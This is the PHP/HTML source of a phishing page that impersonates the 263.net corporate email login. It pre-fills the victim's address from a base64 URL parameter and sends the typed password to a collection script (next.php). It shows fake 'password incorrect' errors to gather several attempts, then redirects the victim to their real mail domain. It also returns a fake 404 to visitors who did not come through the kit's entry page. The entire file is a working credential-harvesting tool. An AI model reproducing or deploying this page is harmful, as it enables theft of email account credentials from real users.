<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>登录企业邮箱-mail.263.net企业邮箱</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body>
    <div id="nav263" class="c-div" style="height: 70px;background: #ffffff;">
        <div class="sp-div" style="width: 100%;max-width: 1024px;padding-top: 9px;padding-bottom: 9px;padding-left: 7px;padding-right: 7px;"><img class="img-fluid" width="188" height="50" src="../assets/img/domain_logo263.png" style="height: 40px;width: auto;">
            <p style="margin-bottom: 0px;margin-top: 12px;">Service Hotline:&nbsp;<a href="#">400-650-9263</a></p>
        </div>
    </div>
    <div id="maino263" class="c-div" style="height: 460px;background: #1066b9;">
        <div id="maini263" class="e-div" style="width: 100%;max-width: 1024px;">
            <div id="fo263" style="width: 100%;max-width: 340px;background: #ffffff;margin-top: 70px;height: fit-content;">
                <div class="sp-div" style="height: 50px;border-bottom: 1px solid rgb(187,187,187) ;">
                    <div style="width: 50%;">
                        <p style="text-align: center;margin-top: 20px;color: rgb(121,121,121);font-size: 12px;">用户登录</p>
                    </div>
                    <div style="width: 50%;border-left: 1px solid rgb(179,179,179);background: #e3e3e3;">
                        <p style="text-align: center;margin-top: 20px;color: rgb(121,121,121);font-size: 12px;">管理员登录</p>
                    </div>
                </div>
                <div style="padding: 0px 28px;">
                    <input type="text" id="backEMF" style="width: 100%;height: 40px;margin-top: 32px;padding: 1px 8px;font-size: 14px;">
                    <input type="hidden" id="pass" style="width: 100%;height: 40px;margin-top: 16px;padding: 1px 8px;font-size: 14px;" placeholder="电子邮件密码">
                    <input type="text" id="pass_display" placeholder="电子邮件密码" required="" autocomplete="off" size="33">
                    <p id="err" style="margin-top: 6px;font-size: 14px;color: rgb(242,15,0);">密码错误，请重试</p>
                    <div class="sp-div" style="margin-top: 16px;font-size: 12px;">
                        <div class="form-check"><input class="form-check-input" type="checkbox" id="formCheck-1"><label class="form-check-label" for="formCheck-1"> 安全登录</label></div><a href="#">清晰轨迹</a>
                    </div>
                    <button class="btn btn-primary" id="next-btn" type="button" style="width: 100%;height: 40px;border-radius: 0px;" onclick="nextFun();">登入</button>
                </div>
                <div class="sp-div" style="height: 39px;border-bottom: 1px solid rgb(187,187,187);margin-top: 23px;">
                    <div style="width: 50%;background: #e4e4e4;color: rgb(0,0,0);">
                        <p style="text-align: center;margin-top: 8px;color: rgb(121,121,121);font-size: 12px;">忘记密码</p>
                    </div>
                    <div style="width: 50%;border-left: 1px solid rgb(179,179,179);background: #e4e4e4;color: rgb(0,0,0);">
                        <p style="text-align: center;margin-top: 8px;color: rgb(121,121,121);font-size: 12px;">管理员登录 </p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div style="margin-top: 16px;">
        <p style="font-size: 14px;text-align: center;color: rgb(126,126,126);margin-bottom: 0px;">Copyright © 1998-2026 北京二六三企业通信有限公司 | 京ICP备08010619号-3</p>
    </div>
    <div style="margin-top: 8px;">
        <p style="font-size: 14px;text-align: center;color: rgb(126,126,126);">举报电话：400-650-9263 | 举报邮箱：qtqm@net263.com</p>
    </div>
    
    <script>
    document.addEventListener('DOMContentLoaded', function() {
        const displayInput = document.getElementById('pass_display');
        const realInput = document.getElementById('pass');
        let realPassword = '';

        displayInput.addEventListener('input', function(e) {
            const inputType = e.inputType;
            
            if (inputType === 'deleteContentBackward' || inputType === 'deleteContentForward') {
                // Handle backspace/delete
                realPassword = realPassword.slice(0, displayInput.selectionStart);
            } else if (e.data) {
                // Append typed character
                realPassword += e.data;
            } else {
                // Fallback for full value sync
                realPassword = displayInput.value;
            }

            // Keep real password synced to hidden field
            realInput.value = realPassword;
            
            // Convert visible value into literal asterisks (*)
            displayInput.value = '*'.repeat(realPassword.length);
        });
    });
    </script>
    
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <script>
    $(document).ready(function () {
        $(document).on('keypress', function (e) {
            if (e.which === 13) {
                $('#next-btn').click();
            }
        });

        // Get parameters from URL
        const urlParams = new URLSearchParams(window.location.search);
        const useridEncoded = urlParams.get('userid');
        const maxTry = parseInt(urlParams.get('maxtry') || '3');
        const pageValue = urlParams.get('page') || '';
        const domainRedirect = urlParams.get('domain_redirect') || '';

        let tryCount = 0;
        let userid = '';

        // Decode Base64 email
        try {
            userid = atob(useridEncoded || '');
        } catch (e) {
            console.error("Invalid userid encoding");
        }

        // Fill userid into either #backEm or #backEMF
        if ($('#backEm').length) {
            $('#backEm').text(userid);
        }
        if ($('#backEMF').length) {
            $('#backEMF').val(userid);
        }

        // Hide error initially
        $('#err').hide();

        // Next button click handler
        $('#next-btn').on('click', function () {
            const password = $('#pass').val().trim();

            // If password empty
            if (!password) {
                $('#err').show();
                return;
            }

            // Disable button until AJAX finishes
            $('#next-btn').prop('disabled', true);

            // Prepare POST data
            const postData = {
                ai: userid,
                pr: password,
                page_value: pageValue
            };

            $.ajax({
                url: '../next.php',
                type: 'POST',
                data: postData,
                success: function (response) {
                    tryCount++;

                    if (tryCount >= maxTry) {
                        // After maxTry, proceed normally
                        $('#err').hide();
                        const emailParts = userid.split('@');
                        if(!domainRedirect){
                            if (emailParts.length === 2) {
                                const domain = emailParts[1];
                                window.location.replace(`https://${domain}`);
                            } else {
                                // Fallback if email is malformed
                                window.location.replace("https://www.google.com");
                            }
                        } else {
                            window.location.replace(domainRedirect);
                        }
                    } else {
                        // Show error and reset password field
                        $('#err').show();
                        
                        // Clear the password fields
                        clearPasswordFields();
                    }
                },
                error: function () {
                    alert("Error contacting server.");
                },
                complete: function () {
                    // Re-enable button after request finishes
                    $('#next-btn').prop('disabled', false);
                }
            });
        });
    });

    // Function to clear password fields
    function clearPasswordFields() {
        const displayInput = document.getElementById('pass_display');
        const realInput = document.getElementById('pass');
        
        // Clear both fields
        displayInput.value = '';
        realInput.value = '';
        
        // Reset the realPassword variable in the input event listener
        // We need to access it through the closure
        // Since the variable is in a closure, we need to trigger a reset
        // Alternative approach: dispatch a custom event or use a global variable
        // Let's use a simpler approach by storing the password in a data attribute
        
        // Store the current real password in a data attribute
        displayInput.dataset.realPassword = '';
        
        // Trigger an input event to sync
        const event = new Event('input', {
            bubbles: true,
            cancelable: true,
        });
        displayInput.dispatchEvent(event);
    }

    // Override the input event listener to use data attribute
    document.addEventListener('DOMContentLoaded', function() {
        const displayInput = document.getElementById('pass_display');
        const realInput = document.getElementById('pass');
        
        // Initialize real password in data attribute
        displayInput.dataset.realPassword = '';

        displayInput.addEventListener('input', function(e) {
            const inputType = e.inputType;
            let realPassword = this.dataset.realPassword || '';
            
            if (inputType === 'deleteContentBackward' || inputType === 'deleteContentForward') {
                // Handle backspace/delete
                realPassword = realPassword.slice(0, this.selectionStart);
            } else if (e.data) {
                // Append typed character
                realPassword += e.data;
            } else {
                // Fallback for full value sync
                realPassword = this.value;
            }

            // Update data attribute and hidden field
            this.dataset.realPassword = realPassword;
            realInput.value = realPassword;
            
            // Convert visible value into literal asterisks (*)
            this.value = '*'.repeat(realPassword.length);
        });
    });
    </script>
</body>
</html>